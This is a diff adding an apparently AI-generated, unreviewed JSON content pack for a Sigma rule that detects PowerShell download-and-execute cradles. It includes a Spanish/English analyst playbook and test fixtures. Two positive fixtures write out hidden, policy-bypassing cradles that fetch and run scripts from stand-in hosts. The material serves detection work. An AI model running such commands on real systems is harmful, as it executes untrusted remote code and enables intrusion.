@@ -1,0 +1,128 @@
+{
+  "rule": {
+    "id": "85b0b087-eddf-4a2b-b033-d771fa2b9775",
+    "title": "PowerShell Download and Execution Cradles",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó un proceso cuya línea de comandos descarga contenido remoto con PowerShell y lo ejecuta de inmediato en memoria con IEX/Invoke-Expression. Este patrón de \"download cradle\" se usa a menudo para cargar payloads sin dejar archivos en disco.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde CommandLine contiene a la vez un método de descarga (.DownloadString(, .DownloadFile(, Invoke-WebRequest, iwr, Invoke-RestMethod, irm) y una forma de ejecución dinámica (IEX, Invoke-Expression o variantes ofuscadas con acentos graves como I`E`X).",
+      "why_it_matters": "Corresponde a ATT&CK T1059 (Command and Scripting Interpreter). Descargar y ejecutar código en un solo paso permite a un atacante cargar herramientas, stagers o ransomware desde un servidor externo, evadiendo controles basados en archivos.",
+      "triage_steps": [
+        "Revise CommandLine completo: identifique la URL, dominio o IP de origen y si hay ofuscación (acentos graves, Base64, -w hidden, -ep bypass).",
+        "Examine ParentImage y la línea de comandos del padre: Office, navegador, wscript, mshta o un servicio son más sospechosos que un instalador o herramienta de despliegue.",
+        "Verifique el usuario y el host: ¿es una cuenta de administrador de TI o un usuario estándar? ¿El host es un servidor crítico?",
+        "Consulte la reputación del dominio/IP y busque conexiones de red del mismo host hacia ese destino en +/- 15 minutos.",
+        "Si es posible, obtenga el script descargado (proxy, caché o sandbox) y analice su contenido sin ejecutarlo en producción.",
+        "Revise procesos hijos, archivos creados, tareas programadas o claves Run generadas en el mismo host en +/- 15 minutos.",
+        "Busque la misma URL o línea de comandos en otros hosts y alertas previas para el mismo usuario o equipo."
+      ],
+      "false_positives": [
+        "Instaladores legítimos de PowerShell (por ejemplo, scripts oficiales de instalación de herramientas como gestores de paquetes) que usan irm | iex.",
+        "Scripts de administración o despliegue de TI que descargan módulos internos desde servidores conocidos de la organización.",
+        "Pruebas autorizadas de red team o validación de controles de seguridad."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el equipo de TI si la ejecución era esperada y si la URL pertenece a un origen confiable; documente la evidencia.",
+        "Si es malicioso, aísle el endpoint desde el EDR y bloquee el dominio/IP en el proxy y firewall.",
+        "Termine los procesos relacionados tras preservar memoria y artefactos; elimine la persistencia identificada.",
+        "Restablezca las credenciales del usuario afectado si hay indicios de robo de credenciales o movimiento lateral.",
+        "Si es legítimo, cree un filtro específico por ParentImage, URL y host en lugar de excluir el patrón completo."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque descargar y ejecutar código en memoria en un solo comando rara vez es legítimo y suele indicar ejecución inicial o un stager."
+    },
+    "en": {
+      "summary": "A process was created whose command line downloads remote content with PowerShell and immediately executes it in memory via IEX/Invoke-Expression. This download cradle pattern is commonly used to load payloads without writing files to disk.",
+      "what_it_detects": "Windows process creation events where CommandLine contains both a download method (.DownloadString(, .DownloadFile(, Invoke-WebRequest, iwr, Invoke-RestMethod, irm) and a dynamic execution form (IEX, Invoke-Expression or backtick-obfuscated variants such as I`E`X).",
+      "why_it_matters": "Maps to ATT&CK T1059 (Command and Scripting Interpreter). Fetching and running code in one step lets an attacker load tools, stagers or ransomware from an external server while evading file-based controls.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the URL, domain or IP and note obfuscation (backticks, Base64, -w hidden, -ep bypass).",
+        "Check ParentImage and its command line: Office, browsers, wscript, mshta or services are more suspicious than an installer or deployment tool.",
+        "Check the user and host: IT admin account or standard user? Is the host a critical server?",
+        "Look up domain/IP reputation and search network connections from the same host to that destination within +/- 15 minutes.",
+        "If possible, retrieve the downloaded script (proxy, cache or sandbox) and analyze it without running it in production.",
+        "Review child processes, dropped files, scheduled tasks or Run keys on the same host within +/- 15 minutes.",
+        "Search for the same URL or command line on other hosts and earlier alerts for the same user or host."
+      ],
+      "false_positives": [
+        "Legitimate PowerShell installers (for example official tool or package manager install scripts) using irm | iex.",
+        "IT administration or deployment scripts pulling internal modules from known organizational servers.",
+        "Authorized red team exercises or security control validation."
+      ],
+      "response_steps": [
+        "Confirm with the user or IT whether the execution was expected and the URL is trusted; document the evidence.",
+        "If malicious, isolate the endpoint via EDR and block the domain/IP at proxy and firewall.",
+        "Kill related processes after preserving memory and artifacts; remove any identified persistence.",
+        "Reset the affected user's credentials if there are signs of credential theft or lateral movement.",
+        "If legitimate, add a narrow filter on ParentImage, URL and host instead of excluding the whole pattern."
+      ],
+      "severity_rationale": "High fits because downloading and executing code in memory in a single command is rarely legitimate and usually indicates initial execution or a stager."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Classic WebClient DownloadString cradle executed with IEX, spawned from Word",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')\""
+        }
+      },
+      {
+        "description": "Short irm piped to iex cradle with execution policy bypass",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-BKP-01.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell -ep bypass -w h -c irm https://update.example.com/ffe | iex"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate download of an installer to disk with Invoke-WebRequest, no dynamic execution",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\admin_ti",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -c Invoke-WebRequest -Uri https://downloads.example.com/agent.msi -OutFile C:\\Temp\\agent.msi"
+        }
+      },
+      {
+        "description": "Local script run with Invoke-Expression but no download method",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0200.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -c Invoke-Expression (Get-Content C:\\Scripts\\inventario.ps1 -Raw)"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
